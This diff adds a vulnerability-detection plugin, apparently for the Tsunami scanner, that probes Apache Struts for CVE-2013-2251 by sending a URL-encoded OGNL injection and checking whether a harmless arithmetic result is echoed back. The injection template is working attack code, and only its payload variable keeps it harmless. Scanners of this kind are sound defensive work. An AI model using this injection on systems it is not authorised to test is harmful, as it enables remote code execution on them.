@@ -1,0 +1,70 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ApacheStruts_CVE_2013_2251"
+  author: "sanjaymahajan14"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2013-2251"
+  }
+  severity: CRITICAL
+  title: "Apache Struts2 S2-016 DefaultActionMapper OGNL Injection"
+  description: "The redirect and redirectAction prefixes allow unauthenticated remote attackers to execute arbitrary OGNL expressions via manipulated URL parameters, leading to system command execution."
+  recommendation: "Upgrade to Apache Struts 2.3.15.1 or later. Note that 2.3.15.1 is still an old version with known vulnerabilities, so updating to the latest version is recommended."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2013-2251"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+# No fingerprint step since fingerprinting struts doesn't appear very easy or reliable.
+
+actions: {
+  name: "probe_s2_016_ognl"
+  http_request: {
+    method: POST
+    uri: "/default.action"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
+    ]
+    data: "redirect:%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23ot%3D%23resp.getWriter%28%29%2C%23ot.print%28{{ PAYLOAD }}%29%2C%23ot.flush%28%29%2C%23ot.close%28%29%7D=1"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ RESULT }}" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "PAYLOAD" value: "%27tsunami%27%2b%281337*1337%29" },
+    { name: "RESULT" value: "tsunami1787569" }
+  ]
+  actions: [
+    "probe_s2_016_ognl"
+  ]
+}
